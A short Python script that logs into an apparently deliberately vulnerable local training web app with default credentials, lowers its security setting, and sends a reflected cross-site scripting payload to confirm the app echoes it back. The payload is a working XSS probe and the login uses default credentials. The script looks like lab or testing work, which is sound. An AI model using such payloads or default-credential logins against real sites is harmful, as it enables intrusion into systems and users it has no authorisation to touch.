import re

import requests


def extract_token(html: str) -> str:
    m = re.search(r"name='user_token'\s+value='([^']+)'", html)
    if m:
        return m.group(1)
    m = re.search(r'name="user_token"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def main() -> None:
    base = "http://127.0.0.1:7777"
    s = requests.Session()

    login = s.get(f"{base}/login.php", timeout=10)
    token = extract_token(login.text)
    print("login page", login.status_code, "token", bool(token))

    resp = s.post(
        f"{base}/login.php",
        data={"username": "admin", "password": "password", "Login": "Login", "user_token": token},
        allow_redirects=True,
        timeout=10,
    )
    print("login post", resp.status_code, "final", resp.url, "cookies", s.cookies.get_dict())

    sec = s.get(f"{base}/security.php", timeout=10)
    sec_token = extract_token(sec.text)
    print("security page", sec.status_code, "token", bool(sec_token))

    sec_post = s.post(
        f"{base}/security.php",
        data={"security": "low", "seclev_submit": "Submit", "user_token": sec_token},
        allow_redirects=True,
        timeout=10,
    )
    print("set security", sec_post.status_code)

    payload = "<svg/onload=alert(document.domain)>"
    x = s.get(f"{base}/vulnerabilities/xss_r/?name={requests.utils.quote(payload)}", timeout=10)
    print("xss_r", x.status_code, "payload_in_body", payload in x.text)
    print("markers", ("Vulnerability: Reflected XSS" in x.text) or ("XSS (Reflected)" in x.text))


if __name__ == "__main__":
    main()

